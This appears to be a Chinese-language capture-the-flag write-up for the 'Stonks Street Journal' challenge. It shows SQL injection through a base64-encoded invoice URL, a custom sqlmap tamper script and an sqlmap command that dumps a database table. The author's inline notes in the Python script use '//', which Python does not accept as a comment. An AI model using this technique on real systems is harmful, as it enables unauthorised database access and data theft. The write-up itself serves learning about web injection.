---
title: Stonks Street Journal
categories:
- wp
feature_text: |
  Stonks Street Journal


---





<!-- more -->

### 2021.12.2 

### Stonks Street Journal

test!

在网站成功注册后可以查看 `invoice`

查看时发现URL末尾有一串看起来像base64编码的字符串

``http://ssj.rumble.host/legacy_invoice_system/Umljay0yMDIxLTExLTI5`

解码后得到`USERNAME-YEAR-MONTH-DAY`

在username后加上`'`，发生SQL报错

```
syntax error at or near "2021"
LINE 1: ...riber WHERE username='jumaoo1'' AND signup_date='2021-11-27...
                                                             ^
```

输入的字符串似乎被拆分成了username和signup date然后被传递到SQL查询中，没有过滤

使用一个自定义SQLMap篡改脚本，利用脚本把payload附加到signup date后面，然后对字符串base64编码，在传递到自定义注入点`GET /legacy_invoice_system/*`

脚本：

```
import base64
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against the payload
__priority__ = PRIORITY.NORMAL   //记住就行（？）

def tamper(payload, **kwargs):    //kwargs就是字典中的key+value
    retVal = base64.b64encode(('jumaoo1-2021-11-27' + payload).encode()).decode()
    
    return retVal
```

塞进SQLmap里执行：

`sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump`

- -r：抓包
- --tamper：脚本
- --threads：多线程
- -T：表名

得到flag
